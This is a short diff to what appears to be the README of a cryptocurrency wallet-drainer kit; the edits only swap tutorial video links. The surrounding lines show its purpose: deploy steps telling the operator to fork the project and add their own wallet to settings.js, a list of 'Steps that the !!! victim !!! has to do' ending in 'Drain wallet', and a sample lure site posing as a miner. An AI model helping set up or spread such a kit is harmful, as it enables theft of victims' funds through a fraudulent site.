@@ -25,7 +25,7 @@ Deploy steps
 
 !!!!!! Make sure you fork it then deploy !!!!!!!
 
-info on how to fork https://youtu.be/ESxOvW-IOg0
+info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
 
 !!!!!! Make sure you add your wallet to settings.js file !!!!!!! this is the settings for smart contract
 
@@ -65,7 +65,7 @@ Steps that the !!! victim !!! has to do
 4.Drain wallet
 
 
-youtube tutorial https://www.youtube.com/watch?v=SnDlcDBAjso
+youtube tutorial https://youtu.be/ESxOvW-IOg0
 sample site https://busdminer.netlify.app/
 
 To use all you have to do is put your wallet address in the settings.js file.
